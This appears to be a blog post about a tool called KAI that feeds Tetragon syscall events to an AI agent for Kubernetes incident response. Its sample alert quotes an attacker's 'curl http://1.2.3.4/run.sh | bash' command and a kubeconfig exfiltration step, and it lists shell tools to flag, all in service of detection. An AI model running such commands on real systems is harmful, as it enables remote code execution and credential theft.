---
title: "Security Incident Response with Tetragon + KAI"
date: 2024-11-28
author: KAI Team
tags: [security, tetragon, incident-response, ebpf]
problem: "By the time IR swaps shell history, the attacker is gone"
solution: "Continuously ingest Tetragon events and let AI summarize suspicious activity"
---

# Security Incident Response with Tetragon + KAI

Modern clusters already run Tetragon, but most teams only open it when the pager rings. KAI shells out to `tetra getevents` whenever a flow runs, parses structured events, and lets Claude rank risks in seconds. Wire it into a cron or alert hook for near-real-time coverage.

---

## Flow: `flow.security_forensics`

1. **Sensor** – `tetragon.syscall_history` streams the last hour of process exec/exit events.
2. **Sensor** – `net.tcp_stats` cross-checks suspicious processes with outbound socket churn.
3. **Agent** – classifies behavior: reverse shells, curl | bash chains, crypto miners, etc.
4. **Action** – currently logs a Slack-style alert message (real Slack delivery lands with the v0.2 action backend).

---

## Real Example

```
Root Cause: kubectl pod exec spawning /bin/sh -> curl -> bash pipeline
Evidence:
- ProcessExec: /bin/sh -c "curl http://1.2.3.4/run.sh | bash"
- Network: outbound 443 to 1.2.3.4 with 12MB transfer
- ProcessExit: child spawned /usr/bin/kubectl cp ~/.kube/config
Recommendation: Revoke pod's service account, rotate kubeconfig
Confidence: 0.96
```

Because Tetragon feeds actual syscall context, the agent can distinguish between legitimate `curl` health checks and suspicious file exfiltration.

---

## Automating IR Runbooks

- Tag critical binaries (`/bin/bash`, `nc`, `python`, `scp`) as suspicious in the backend helper.
- Use `saturation_analysis` style prompts to demand specific outputs: attacker IPs, commands, artifacts touched.
- Feed the response straight into your SOAR or PagerDuty notes.

You end up with Slack messages like "Suspicious exec on payments pod, recommended action: cordon node + rotate DB creds" instead of log snippets nobody reads.
Run it:

```bash
git clone https://github.com/yourusername/kai.git
cd kai
make build
sudo -E ./bin/kaictl run flow.security_forensics
```

The final step prints the Slack payload so you can copy/paste into the channel while the write-enabled backend is still under construction.
